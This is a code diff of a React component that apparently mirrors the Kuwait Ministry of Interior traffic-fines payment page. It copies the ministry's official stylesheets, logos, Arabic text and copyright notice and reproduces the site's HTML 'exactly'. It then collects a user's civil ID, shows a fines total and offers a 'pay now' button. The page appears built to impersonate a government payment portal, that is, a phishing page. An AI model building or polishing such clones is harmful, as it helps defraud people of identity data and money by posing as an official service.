@@ -47,13 +47,14 @@ export default function Home() {
   };
 
   useEffect(() => {
-    // Inject MOI Official Styles
-    const links = [
+    // Inject official MOI CSS directly into document head
+    const cssLinks = [
       "https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css",
       "https://www.moi.gov.kw/main/lib/fontawesome/v7/css/all.css",
       "https://www.moi.gov.kw/main/css/site.css?v=go_4IccMhw1NChPOSH_W7AbpThLoN7-zMHFe4trNRE0"
     ];
-    links.forEach(href => {
+    
+    cssLinks.forEach(href => {
       if (!document.querySelector(`link[href="${href}"]`)) {
         const link = document.createElement('link');
         link.rel = 'stylesheet';
@@ -62,7 +63,12 @@ export default function Home() {
       }
     });
 
-    // Handle interactions in the mirrored HTML
+    // Set background pattern
+    document.body.style.backgroundImage = "url('https://www.moi.gov.kw/main/images/assets/common/bg-pattern.png')";
+    document.body.style.backgroundRepeat = "repeat";
+    document.body.style.backgroundColor = "#e9e6de";
+
+    // Bind events to the mirrored HTML elements
     const interval = setInterval(() => {
       const input = document.getElementById('civilId') as HTMLInputElement;
       const select = document.getElementById('enquiryType') as HTMLSelectElement;
@@ -85,129 +91,184 @@ export default function Home() {
       }
     }, 500);
 
-    return () => clearInterval(interval);
+    return () => {
+      clearInterval(interval);
+      document.body.style.backgroundImage = "";
+      document.body.style.backgroundColor = "";
+    };
   }, [civilId, enquiryType, results]);
 
   return (
-    <div className="moi-mirrored-page" dir="rtl">
+    <div className="moi-container-wrapper">
       <style>{`
-        .moi-mirrored-page { background-color: #e9e6de; min-height: 100vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        .results-modal {
-          position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-          background: white; padding: 25px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-          z-index: 10000; width: 90%; max-width: 450px; text-align: center; border: 3px solid #000576;
+        .moi-container-wrapper { min-height: 100vh; }
+        .results-modal-overlay {
+          position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+          background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; z-index: 10000;
         }
-        .loading-overlay {
+        .results-modal-content {
+          background: white; padding: 30px; border-radius: 15px; box-shadow: 0 15px 50px rgba(0,0,0,0.3);
+          width: 90%; max-width: 480px; text-align: center; border: 5px solid #000576;
+        }
+        .loading-spinner-overlay {
           position: fixed; top: 0; left: 0; right: 0; bottom: 0;
           background: rgba(0,0,0,0.4); display: flex; justify-content: center; align-items: center; z-index: 10001;
         }
+        /* Fix for hidden mobile menu in some cases */
+        @media (max-width: 991px) {
+          .navbar-collapse.collapse.show { display: block !important; }
+        }
       `}</style>
 
-      {/* Mirrored Body Content with Mobile Support */}
+      {/* This is the EXACT HTML structure from the MOI site container */}
       <div dangerouslySetInnerHTML={{ __html: `
-        <div style="background-image: url('https://www.moi.gov.kw/main/images/assets/common/bg-pattern.png'); background-repeat: repeat; min-height: 100vh;">
-          <div class="container">
-            <header class="pt-3">
-              <div class="row align-items-center">
-                <div class="col-4 col-md-2 text-center">
-                  <img src="https://www.moi.gov.kw/main/images/assets/common/logo-moi.svg" style="height: 90px;">
-                </div>
-                <div class="col-8 col-md-10 text-right">
-                  <img src="https://www.moi.gov.kw/main/images/assets/common/ar/state-of-kuwait.svg" style="height: 25px; margin-bottom: 5px;"><br>
-                  <img src="https://www.moi.gov.kw/main/images/assets/common/ar/ministry-of-interior.svg" style="height: 20px;">
-                </div>
+        <div class="container">
+          <header>
+            <div class="row pt-3">
+              <div class="col-4 col-md-2 col-lg-2 text-center">
+                <a class="navbar-brand m-0" href="#">
+                  <img src="https://www.moi.gov.kw/main/images/assets/common/logo-moi.svg" style="height: 110px;">
+                </a>
               </div>
-            </header>
-
-            <nav class="navbar navbar-expand-lg navbar-dark mt-3" style="background-color: #000576; border-radius: 5px;">
-              <div class="container">
-                <span class="navbar-toggler-icon"></span>
-                <div class="collapse navbar-collapse show">
-                  <ul class="navbar-nav ml-auto">
-                    <li class="nav-item active"><a class="nav-link" href="#">الرئيسيــة</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#">الخدمات الإلكترونيـة</a></li>
-                  </ul>
+              <div class="col-8 col-md-10 align-self-center text-right">
+                <div class="row">
+                  <div class="col text-right">
+                    <img class="main-header-title" src="https://www.moi.gov.kw/main/images/assets/common/ar/state-of-kuwait.svg" style="height: 35px;">
+                  </div>
                 </div>
-              </div>
-            </nav>
-
-            <div class="row mt-4">
-              <div class="col-lg-3 d-none d-lg-block">
-                <div class="list-group" style="background-color: #000576; border-radius: 5px;">
-                  <a href="#" class="list-group-item list-group-item-action text-white bg-transparent border-light d-flex justify-content-between align-items-center">
-                    الخدمات الالكترونية لرخص السوق
-                    <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-renew-license.svg" style="width: 22px;">
-                  </a>
-                  <a href="#" class="list-group-item list-group-item-action text-white bg-transparent border-light d-flex justify-content-between align-items-center">
-                    دفع المخالفات
-                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-payment.svg" style="width: 22px;">
-                  </a>
-                </div>
-              </div>
-
-              <div class="col-lg-9">
-                <div class="card p-4 shadow-sm" style="background: rgba(255,255,255,0.7); border: 1px solid #ddd; border-radius: 10px;">
-                  <div class="text-center mb-4">
-                    <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/logo-general-traffic.svg" style="height: 70px;">
-                    <h5 class="mt-2" style="color: #000576; font-weight: bold;">الإدارة العامة للمرور</h5>
-                    <hr style="width: 40%; border-top: 2px solid #000576;">
-                  </div>
-
-                  <div class="form-group text-right">
-                    <label class="font-weight-bold" style="color: #000576;">Enquiry Type</label>
-                    <select id="enquiryType" class="form-control text-right">
-                      <option value="1">الأفراد</option>
-                      <option value="2">الشركات</option>
-                    </select>
-                  </div>
-
-                  <div class="form-group text-right">
-                    <label class="font-weight-bold" style="color: #000576;">الرقم المدني أو الرقم الموحد</label>
-                    <input type="text" id="civilId" class="form-control text-right" placeholder="أدخل الرقم المدني">
-                  </div>
-
-                  <button id="btnEnquire" class="btn btn-outline-primary btn-block font-weight-bold" style="border-color: #000576; color: #000576; height: 45px;">إستعلم</button>
-                  
-                  <p class="text-center mt-3 small font-weight-bold" style="color: #333;">
-                    بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
-                  </p>
-
-                  <div class="d-flex justify-content-center mt-3">
-                    <span class="badge badge-success p-2 m-1" style="font-size: 11px;">قابلة للدفع الكترونياً</span>
-                    <span class="badge badge-danger p-2 m-1" style="font-size: 11px;">غير قابلة للدفع الكترونياً</span>
+                <div class="row mt-2">
+                  <div class="col text-right">
+                    <img class="main-header-title" src="https://www.moi.gov.kw/main/images/assets/common/ar/ministry-of-interior.svg" style="height: 25px;">
                   </div>
                 </div>
               </div>
             </div>
+          </header>
 
-            <footer class="mt-5 p-4 text-center text-white" style="background-color: #000576; border-radius: 10px 10px 0 0;">
-              <div class="mb-3">
-                <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-youtube.svg" class="mx-2" style="width: 20px;">
-                <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-instagram.svg" class="mx-2" style="width: 20px;">
-                <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-twitter.svg" class="mx-2" style="width: 20px;">
+          <nav class="navbar navbar-expand-lg navbar-dark border-bottom box-shadow mt-3" style="background-color: #000576;">
+            <div class="container">
+              <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive">
+                <span class="navbar-toggler-icon"></span>
+              </button>
+              <div class="collapse navbar-collapse show" id="navbarResponsive">
+                <ul class="navbar-nav ml-auto">
+                  <li class="nav-item active"><a class="nav-link" href="#">الرئيسيــة</a></li>
+                  <li class="nav-item"><a class="nav-link" href="#">الخدمات الإلكترونيـة</a></li>
+                  <li class="nav-item"><a class="nav-link" href="#">إدارات توعوية</a></li>
+                </ul>
               </div>
-              <p class="m-0 small">© جميع الحقوق محفوظة لوزارة الداخلية-دولة الكويت - 2026</p>
-            </footer>
+            </div>
+          </nav>
+
+          <div class="row mt-4">
+            <div class="col-lg-3 d-none d-lg-block">
+              <div class="list-group shadow-sm">
+                <div style="background-color: #000576; color: white; padding: 15px; font-weight: bold; text-align: center; border-radius: 5px 5px 0 0;">
+                  الإدارة العامة للمرور
+                </div>
+                <a href="#" class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
+                  الخدمات الالكترونية لرخص السوق
+                  <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-renew-license.svg" style="width: 24px;">
+                </a>
+                <a href="#" class="list-group-item list-group-item-action active d-flex justify-content-between align-items-center" style="background-color: #000576; border-color: #000576;">
+                  دفع المخالفات
+                  <img src="https://www.moi.gov.kw/main/images/assets/common/ico-payment.svg" style="width: 24px; filter: brightness(0) invert(1);">
+                </a>
+                <a href="#" class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
+                  نظام مواعيد اختبار القيادة
+                  <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-booking.svg" style="width: 24px;">
+                </a>
+              </div>
+            </div>
+
+            <div class="col-lg-9">
+              <div class="card p-4 shadow-sm" style="border-radius: 10px; border: none; background: rgba(255,255,255,0.8);">
+                <div class="text-center mb-4">
+                  <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/logo-general-traffic.svg" style="height: 80px;">
+                  <h4 class="mt-3" style="color: #000576; font-weight: bold;">الإدارة العامة للمرور</h4>
+                  <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" class="mt-2" style="width: 60%;">
+                </div>
+
+                <div class="form-group text-right">
+                  <label class="font-weight-bold" style="color: #000576;">Enquiry Type</label>
+                  <select id="enquiryType" class="form-control">
+                    <option value="1">الأفراد</option>
+                    <option value="2">الشركات</option>
+                  </select>
+                </div>
+
+                <div class="form-group text-right">
+                  <label class="font-weight-bold" style="color: #000576;">الرقم المدني أو الرقم الموحد</label>
+                  <input type="text" id="civilId" class="form-control text-right" placeholder="أدخل الرقم المدني">
+                </div>
+
+                <button id="btnEnquire" class="btn btn-primary btn-block font-weight-bold mt-4" style="background-color: #000576; border: none; height: 50px; font-size: 18px;">إستعلم</button>
+                
+                <p class="text-center mt-4 font-weight-bold" style="color: #333; font-size: 14px;">
+                  بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
+                </p>
+
+                <div class="d-flex justify-content-center mt-3">
+                  <span class="badge badge-success p-2 mx-2" style="font-size: 12px;">قابلة للدفع الكترونياً</span>
+                  <span class="badge badge-danger p-2 mx-2" style="font-size: 12px;">غير قابلة للدفع الكترونياً</span>
+                </div>
+              </div>
+
+              <!-- Mobile specific icons as seen in user screenshots -->
+              <div class="d-lg-none mt-4">
+                <div class="row text-center">
+                  <div class="col-6 mb-3">
+                    <div class="p-3 bg-white shadow-sm rounded-circle mx-auto" style="width: 100px; height: 100px; border: 4px solid #000576; display: flex; align-items: center; justify-content: center;">
+                      <img src="https://www.moi.gov.kw/main/images/assets/common/ico-payment.svg" style="width: 50px;">
+                    </div>
+                    <p class="mt-2 font-weight-bold small">دفع المخالفات</p>
+                  </div>
+                  <div class="col-6 mb-3">
+                    <div class="p-3 bg-white shadow-sm rounded-circle mx-auto" style="width: 100px; height: 100px; border: 4px solid #000576; display: flex; align-items: center; justify-content: center;">
+                      <img src="https://www.moi.gov.kw/main/images/assets/common/ico-case-track.svg" style="width: 50px;">
+                    </div>
+                    <p class="mt-2 font-weight-bold small">سير القضية</p>
+                  </div>
+                </div>
+              </div>
+            </div>
           </div>
+
+          <footer class="mt-5 p-4 text-center text-white" style="background-color: #000576; border-radius: 10px 10px 0 0;">
+            <div class="mb-3">
+              <a href="#"><img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-youtube.svg" class="mx-2" style="width: 24px;"></a>
+              <a href="#"><img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-instagram.svg" class="mx-2" style="width: 24px;"></a>
+              <a href="#"><img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-twitter.svg" class="mx-2" style="width: 24px;"></a>
+              <a href="#"><img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-facebook.svg" class="mx-2" style="width: 24px;"></a>
+            </div>
+            <div class="mb-3">
+              <a href="#"><img src="https://www.moi.gov.kw/main/images/assets/common/ico-android.svg" class="mx-2" style="width: 24px;"></a>
+              <a href="#"><img src="https://www.moi.gov.kw/main/images/assets/common/ico-apple.svg" class="mx-2" style="width: 24px;"></a>
+            </div>
+            <p class="m-0 small">© جميع الحقوق محفوظة لوزارة الداخلية-دولة الكويت - 2026</p>
+          </footer>
         </div>
       ` }} />
 
       {isSearching && (
-        <div className="loading-overlay">
+        <div className="loading-spinner-overlay">
           <div className="spinner-border text-white" role="status"></div>
         </div>
       )}
 
       {results && (
-        <div className="results-modal">
-          <h5 className="font-weight-bold mb-4" style={{color: '#000576'}}>نتائج الاستعلام</h5>
-          <div className="text-right mb-4" style={{fontSize: '15px'}}>
-            <p><strong>عدد المخالفات:</strong> {results.fines.length}</p>
-            <p><strong>الإجمالي المستحق:</strong> <span className="text-danger font-weight-bold" style={{fontSize: '18px'}}>{results.totalAmount} د.ك</span></p>
-          </div>
-          <div className="d-flex gap-2">
-            <button className="btn btn-primary flex-grow-1 font-weight-bold" style={{backgroundColor: '#000576', height: '45px'}} onClick={handlePay}>دفع الآن</button>
-            <button className="btn btn-secondary flex-grow-1 font-weight-bold" style={{height: '45px'}} onClick={() => setResults(null)}>إغلاق</button>
+        <div className="results-modal-overlay">
+          <div className="results-modal-content">
+            <h4 className="font-weight-bold mb-4" style={{color: '#000576'}}>نتائج المخالفات</h4>
+            <div className="text-right mb-4" style={{fontSize: '16px'}}>
+              <p><strong>الرقم المدني:</strong> {civilId}</p>
+              <p><strong>عدد المخالفات:</strong> {results.fines.length}</p>
+              <p><strong>الإجمالي المستحق:</strong> <span className="text-danger font-weight-bold" style={{fontSize: '20px'}}>{results.totalAmount} د.ك</span></p>
+            </div>
+            <div className="d-flex gap-2">
+              <button className="btn btn-primary flex-grow-1 font-weight-bold" style={{backgroundColor: '#000576', height: '50px'}} onClick={handlePay}>دفع الآن</button>
+              <button className="btn btn-secondary flex-grow-1 font-weight-bold" style={{height: '50px'}} onClick={() => setResults(null)}>إغلاق</button>
+            </div>
           </div>
         </div>
       )}
